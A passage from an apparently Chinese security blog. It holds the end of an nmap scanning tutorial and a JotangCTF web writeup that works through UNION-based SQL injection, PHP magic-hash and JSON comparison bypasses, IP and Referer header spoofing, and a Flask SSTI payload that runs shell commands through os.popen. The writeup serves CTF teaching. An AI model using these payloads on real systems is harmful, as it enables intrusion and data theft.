class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">9</span>、nmap万能开关<br>包含了<span class="hljs-number">1</span><span class="hljs-number">-10000</span>端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测<br>命令语法： <br>nmap -A &lt;target ip&gt;<br>例子：nmap -A <span class="hljs-number">10.1</span><span class="hljs-number">.112</span><span class="hljs-number">.89</span><br>[<span class="hljs-meta">root@docker-node4 ~</span>]<span class="hljs-meta">#  nmap -A 192.168.1.105</span><br>Starting Nmap <span class="hljs-number">6.40</span> ( http:<span class="hljs-comment">//nmap.org ) at 2019-08-18 05:23 CST</span><br>Stats: <span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">09</span> elapsed; <span class="hljs-number">0</span> <span class="hljs-function">hosts <span class="hljs-title">completed</span> (<span class="hljs-params"><span class="hljs-number">1</span> up</span>), 1 undergoing SYN Stealth Scan</span><br><span class="hljs-function">SYN Stealth Scan Timing: About 86.40% done</span>; ETC: <span class="hljs-number">05</span>:<span class="hljs-number">24</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">09</span> remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.105</span><br><span class="hljs-function">Host <span class="hljs-keyword">is</span> <span class="hljs-title">up</span> (<span class="hljs-params"><span class="hljs-number">0.064</span>s latency</span>).</span><br><span class="hljs-function">All 1000 scanned ports <span class="hljs-keyword">on</span> 192.168.1.105 are filtered</span><br><span class="hljs-function">MAC Address: F4:D1:08:BE:1C:<span class="hljs-title">CA</span> (<span class="hljs-params">Unknown</span>)</span><br><span class="hljs-function">Too many fingerprints match <span class="hljs-keyword">this</span> host to give specific OS details</span><br><span class="hljs-function">Network Distance: 1 hop</span><br><span class="hljs-function">TRACEROUTE</span><br><span class="hljs-function">HOP RTT      ADDRESS</span><br><span class="hljs-function">1   63.61 ms 192.168.1.105</span><br><span class="hljs-function">OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at http:<span class="hljs-comment">//nmap.org/submit/ .</span></span><br><span class="hljs-function">Nmap done: 1 IP <span class="hljs-title">address</span> (<span class="hljs-params"><span class="hljs-number">1</span> host up</span>) scanned <span class="hljs-keyword">in</span> 82.40 seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">10</span>、nmap命令混合式扫描<br>可以做到类似参数-A所完成的功能，但又能细化我们的需求要求<br>命令语法： <br>nmap -vv -p1-<span class="hljs-number">100</span> -O &lt;target ip&gt;<br>例子： <br>nmap -vv -p1-<span class="hljs-number">100</span> -O <span class="hljs-number">10.1</span><span class="hljs-number">.112</span><span class="hljs-number">.89</span><br>[<span class="hljs-symbol">root@</span>docker-node4 ~]#  nmap -vv -p1-<span class="hljs-number">100</span> -o <span class="hljs-number">173.22</span><span class="hljs-number">.90</span><span class="hljs-number">.10</span><br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http<br>MAC Address: <span class="hljs-number">00</span>:0C:<span class="hljs-number">29</span>:CF:A7:<span class="hljs-number">30</span> (VMware)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS <span class="hljs-keyword">is</span> running on it, see http:<span class="hljs-comment">//nmap.org/submit/ ).</span><br>TCP/IP fingerprint:<br>OS:SCAN(V=<span class="hljs-number">6.40</span>%E=<span class="hljs-number">4</span>%D=<span class="hljs-number">8</span>/<span class="hljs-number">18</span>%OT=<span class="hljs-number">22</span>%CT=<span class="hljs-number">1</span>%CU=<span class="hljs-number">39398</span>%PV=N%DS=<span class="hljs-number">1</span>%DC=D%G=Y%M=000C29%T<br>OS:M=5D58714F%P=x86_64-redhat-linux-gnu)SEQ(SP=<span class="hljs-number">107</span>%GCD=<span class="hljs-number">1</span>%ISR=<span class="hljs-number">10D</span>%TI=Z%TS=A)<br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">11</span>、穿透防火墙进行扫描<br>命令语法： <br>nmap -Pn -A &lt;target&gt;<br>例子：<br>nmap -Pn -A www.2cto.com<br></code></pre></td></tr></table></figure><h4 id="Nmap脚本引擎"><a href="#Nmap脚本引擎" class="headerlink" title="Nmap脚本引擎"></a>Nmap脚本引擎</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">1</span>、扫描web敏感目录:<br>nmap -p <span class="hljs-number">80</span> --script=http-<span class="hljs-keyword">enum</span>.nse www.text.com<br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">2</span>、使用所有的脚本进行扫描：<br>nmap -p <span class="hljs-number">80</span> --script all www.test.com<br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">3</span>、使用通配符扫描：<br>nmap -p <span class="hljs-number">80</span> --script <span class="hljs-string">&quot;http-*&quot;</span> www.text.com<br></code></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-number">4</span>、扫描sql注入漏洞：<br>nmap -p <span class="hljs-number">80</span> --script=sql-injection.nse www.text.com<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
      <tag>Nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JotangCTF Writeup</title>
    <link href="/2020/10/31/JotangCTF-wp/"/>
    <url>/2020/10/31/JotangCTF-wp/</url>
    
    <content type="html"><![CDATA[<h2 id="JotangCTF-Writeup"><a href="#JotangCTF-Writeup" class="headerlink" title="JotangCTF Writeup"></a>JotangCTF Writeup</h2><blockquote><p>本来是不打算写的，感觉没什么好写的，后来发现把一个学长的题糊了之后还有点空闲时间，就顺手写一下好了</p></blockquote><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>签到题希望大家都认真看了，虽然招新赛没那么正规，难度也不大，但是养成一个<strong>仔细阅读比赛规则和说明</strong>的习惯还是要有的。</p><p>这个题 flag 很简单，hint 也给出来了，把 ZmxhZ3tIZWxsb19Kb3RhbmchfQ== 随便放到一个在线工具里或者自己写一个程序用 base64 解密就可以拿到 flag 。</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;Hello_Jotang!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="NothingHere"><a href="#NothingHere" class="headerlink" title="NothingHere"></a>NothingHere</h3><p>因为不需要<strong>任何形式</strong>的爆破，先手 F12 就冲上去了。但这里还是可以多提一嘴，有些情况下网页并不准许使用鼠标右键和 F12 ，直接在 url 前面加上 view-source: 回车就好。</p><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>&#123;f12_yyds!<span class="hljs-variable">_hmmmmm_Not_so_much</span>...&#125;<br></code></pre></td></tr></table></figure><h3 id="GET-amp-POST"><a href="#GET-amp-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先不说 GET 和 POST ，php 相关的题目在 CTF 还蛮多的，花里胡哨的啥都有我这也不好总结（我完全没有暗示疯狂刷题的意思），但个人认为 php 最重要的就是<strong>读懂代码，代码审计</strong>（其他语言也是一样的），给出源码的题目如果连看都看不懂那就无了呀，当然也会遇到 “啊，这个语言我没学过，这个框架我不知道，完蛋了” 的情况，解决办法也很简单，现学啊hhhhhh，抛开 CTF 不说，突然被要求做一个自己完全不了解的东西的情况还有很多（相信大家在招新赛的其他题目中有所感受到），自学能力很重要。</p><p>说回题目，这个题要求用 GET 的方法获取一个任意的 a ，用 POST 的方法获取一个任意的 b ，做出来的人蛮多的我就不赘述什么是 GET ，什么是 POST 了，Hackbar 一把梭就好。</p><p><img src="https://s1.ax1x.com/2020/10/15/0oIywQ.png" alt="0oIywQ.png"></p><h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;very_bas<span class="hljs-number">1</span>c_but_necessary&#125;<br></code></pre></td></tr></table></figure><h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><blockquote><p>sql 注入一定要确认数据库类型，注入点位置，注入类型，回显情况等一些基本线索或者信息，并以此来推断后端的逻辑，然后再进行后续的操作</p></blockquote><p>提交数字 1 到 4 后会回显诗句，数字 5 以后error，其他单个符号和字母报错，回显：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">error <span class="hljs-number">1064</span> : You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以确定数据库用的是 <strong>MySQL</strong></p><p>输入 1’  提交，回显：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">check</span> the <span class="hljs-keyword">manual</span> that corresponds <span class="hljs-keyword">to</span> your MySQL <span class="hljs-keyword">server</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> near <span class="hljs-string">&#x27;&#x27;&#x27; at line 1</span><br></code></pre></td></tr></table></figure><p>可以确定 <strong>注入点</strong> 以及类型是 <strong>数字型注入</strong></p><p>可以猜测后端 sql 语句大概是</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> poem <span class="hljs-keyword">where</span> poetry = $inject;<br></code></pre></td></tr></table></figure><h4 id="进一步的操作"><a href="#进一步的操作" class="headerlink" title="进一步的操作"></a>进一步的操作</h4><h4 id="爆字段数量"><a href="#爆字段数量" class="headerlink" title="爆字段数量"></a>爆字段数量</h4><p>输入 1 order by 1 和 1 order by 2 提交正常回显，输入 1 order by 3 提交报错，因此 <strong>字段数量为 2</strong></p><img src="https://s1.ax1x.com/2020/10/15/0oIgFs.png" alt="0oIgFs.png" style="zoom:67%;" /><h4 id="确认插入位置"><a href="#确认插入位置" class="headerlink" title="确认插入位置"></a>确认插入位置</h4><p>输入 1 union select 1,2 可以看到回显诗句和另起一行的数字2，因此 <strong>第二个位置可以插入sql语句</strong></p><img src="https://s1.ax1x.com/2020/10/15/0oI6oj.png" alt="0oI6oj.png" style="zoom:67%;" /><h4 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h4><p>输入 1 union select 1,database() 回显，因此 <strong>当前数据库为easysql</strong> </p><img src="https://s1.ax1x.com/2020/10/15/0oIseg.png" alt="0oIseg.png" style="zoom:67%;" /><h4 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h4><p>输入 1 union select 1,group_concat(schema_name) from information_schema.schemata 回显，因此可以确定需要的东西就在easysql中</p><img src="https://s1.ax1x.com/2020/10/15/0ooGcV.png" alt="0ooGcV.png" style="zoom:67%;" /><h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>输入 1 union select 1,table_name from information_schema.tables where table_schema=’easysql’ 回显，因此 <strong>flag 多半就在表 flaghere 中</strong></p><p>*一般最好用 group_concat() 包裹一下 table_name ，这里是我懒得加了，后面的 column_name 也是如此</p><img src="https://s1.ax1x.com/2020/10/15/0ooD91.png" alt="0ooD91.png" style="zoom:67%;" /><h4 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h4><p>输入 1 union select 1,column_name from information_schema.columns where table_name=’flaghere’ 回显，因此 <strong>只存在一个名为 flag 的字段</strong></p><img src="https://s1.ax1x.com/2020/10/15/0oofNd.png" alt="0oofNd.png" style="zoom:67%;" /><h4 id="拿-flag"><a href="#拿-flag" class="headerlink" title="拿 flag"></a>拿 flag</h4><p>输入 1 union select 1,flag from flaghere 回显，拿到 flag</p><img src="https://s1.ax1x.com/2020/10/15/0ooXNj.png" alt="0ooXNj.png" style="zoom:67%;" /><h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;never_trust_user_input!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="SheIsAlwaysTheBEST"><a href="#SheIsAlwaysTheBEST" class="headerlink" title="SheIsAlwaysTheBEST"></a>SheIsAlwaysTheBEST</h3><blockquote><p>了解 php 语言特性 ×</p><p>了解很多语言的特性 √</p></blockquote><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (ctype_alpha(<span class="hljs-variable">$a</span>) &amp; is_numeric(<span class="hljs-variable">$b</span>) &amp; md5((<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$a</span>)) == md5((<span class="hljs-keyword">string</span>)((<span class="hljs-variable">$b</span>)))) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>)) &#123;<br>            <span class="hljs-variable">$c</span> = json_decode(<span class="hljs-variable">$c</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;key == <span class="hljs-variable">$flag</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong c.&lt;br&gt;&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give me a c.&lt;br&gt;&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong a or b.&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;give me a &amp; b.&lt;br&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>本来是想从 old-rick 那个题扣一部分下来的，但那个题太阴间了想了想还是算了，整简单点好了。</p><p>不难看出主要在于两个点</p><h4 id="第一点"><a href="#第一点" class="headerlink" title="第一点"></a>第一点</h4><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">ctype_alpha</span>($a) &amp; is_numeric($b) &amp; md5((<span class="hljs-name">string</span>)($a)) == md5((<span class="hljs-name">string</span>)(($b))))<br></code></pre></td></tr></table></figure><p>要求 a 中所有字符只包含字母，b 只能是数字，a 和 b 的md5 值要<strong>弱相等</strong></p><p>关键在于<strong>php在通过”!=”和”==”比较处理哈希字符串时，会把每一个以“0E”或“0e”开头的哈希值都解释为0</strong>，因此只需要 md5(a) 和 md5(b) 的最终值以 0e 和 0E 开头就行，在网上不难找到 </p><p>MD5(“240610708”) == md5(“QNKCDZO”) </p><h4 id="第二点"><a href="#第二点" class="headerlink" title="第二点"></a>第二点</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$c</span> = json_decode(<span class="hljs-variable">$c</span>);<br>if (<span class="hljs-variable">$c</span>-&gt;key == <span class="hljs-variable">$flag</span>)<br></code></pre></td></tr></table></figure><p>要求 c 在通过 json 解码后要和 flag 相等，双等号就不赘述了，这种时候应该直接贴个这个图</p><p><img src="https://s1.ax1x.com/2020/10/15/0TI3DS.png" alt="0TI3DS.png"></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><img src="https://s1.ax1x.com/2020/10/15/0ToQi9.png" alt="0ToQi9.png"></p><h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag&#123;php<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>worthy<span class="hljs-number">_</span><span class="hljs-keyword">of</span><span class="hljs-number">_</span>being<span class="hljs-number">_</span>the<span class="hljs-number">_</span>best!&#125;<br></code></pre></td></tr></table></figure><h3 id="IP-amp-Referer"><a href="#IP-amp-Referer" class="headerlink" title="IP&amp;Referer"></a>IP&amp;Referer</h3><p>这里用 Burp Suite 演示好了，不要老用Hackbar嘛</p><p>首先题目要求请求端的 IP 为 1.1.1.1</p><img src="https://s1.ax1x.com/2020/10/15/0ToTyV.png" alt="0ToTyV.png" style="zoom:50%;" /><p>在 HTTP 包中添加 X-Forwarded-For:1.1.1.1 后用 Reapter 发包。X-Forwarded-For 是一个 HTTP 扩展头部，用来表示 HTTP 请求端真实 IP。这里多一嘴，并不是改了这个东西，就真的识别不出来真实 IP 了</p><p><img src="https://s1.ax1x.com/2020/10/15/0T7Qjx.png" alt="0T7Qjx.png"></p><p>然后发现告诉我们要求 Referer 为 <a href="http://www.doyouhaveagirlfriend.com/">www.doyouhaveagirlfriend.com</a></p><p>于是在 HTTP 包中添加 Referer:<a href="http://www.doyouhaveagirlfriend.com/">www.doyouhaveagirlfriend.com</a> 后用 Reapter 发包，flag到手</p><p><img src="https://s1.ax1x.com/2020/10/15/0T7rb8.png" alt="0T7rb8.png"></p><h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;sometimes_can_fake_sometimes_cannot&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EasyFLASK"><a href="#EasyFLASK" class="headerlink" title="EasyFLASK"></a>EasyFLASK</h3><blockquote><p>不只有 flask</p></blockquote><p>看页面描述让 POST 一个 name 进去，先试试呗</p><p><img src="https://s1.ax1x.com/2020/10/15/07C8Nn.png" alt="07C8Nn.png"></p><p>可以看出传入什么，就会回显什么，同时根据题目 flask 的提示，猜测是 ssti ，后台可能存在类似下面的代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">render_template_string</span><span class="hljs-params">(name)</span></span><br></code></pre></td></tr></table></figure><p>传 4 ，回显 4，可以确认存在 ssti </p><p><img src="https://s1.ax1x.com/2020/10/15/07CIUA.png" alt="07CIUA.png"></p><p>这里我先给出最终的 payload ，然后再一节一节的分析，毕竟截图传图床很麻烦的</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/10/15/07PM26.png" alt="07PM26.png"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"># 获得一个字符串实例<br><span class="hljs-string">&quot;&quot;</span><br><br># 获得字符串的<span class="hljs-keyword">type</span>实例<br><span class="hljs-string">&quot;&quot;</span>.__class__<br><br># 获得其基类，当然你也可以用__mro__获得其父类<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span></span></span><br><span class="hljs-module-access"><span class="hljs-module"></span></span><br><span class="hljs-module-access"><span class="hljs-module">#</span></span> 获得基类中的<span class="hljs-keyword">object</span>类<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>] <br><br># 使用<span class="hljs-constructor">__subclasses__()</span>方法，获得<span class="hljs-keyword">object</span>类的子类<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>] .<span class="hljs-constructor">__subclasses__()</span><br><br># 获得第<span class="hljs-number">132</span>个子类，&lt;<span class="hljs-keyword">class</span> &#x27;os._wrap_close&#x27;&gt;，当然还有更多的子类可以用，可以自己写一个程序来找，至于找索引的问题应该不需要我讲吧<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>] .<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">132</span>]</span><br><br># 对os类进行init初始化，使用globals来获取所有的方法、变量、参数<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">132</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span></span></span><br><span class="hljs-module-access"><span class="hljs-module"></span></span><br><span class="hljs-module-access"><span class="hljs-module">#</span></span> <span class="hljs-keyword">function</span> popen读取文件<br><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">132</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;popen&#x27;](&#x27;cat flag&#x27;).read<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h4><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag&#123;flask<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>interesting<span class="hljs-number">_</span>but<span class="hljs-number">_</span>sometimes<span class="hljs-number">_</span>dangerous&#125;<br></code></pre></td></tr></table></figure><h3 id="EasyUPLOAD"><a href="#EasyUPLOAD" class="headerlink" title="EasyUPLOAD"></a>EasyUPLOAD</h3><blockquote><p>真的没有人传奇奇怪怪的图，可恶，我还以为会有什么好康的图呢</p></blockquote><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$oldname</span> = <span 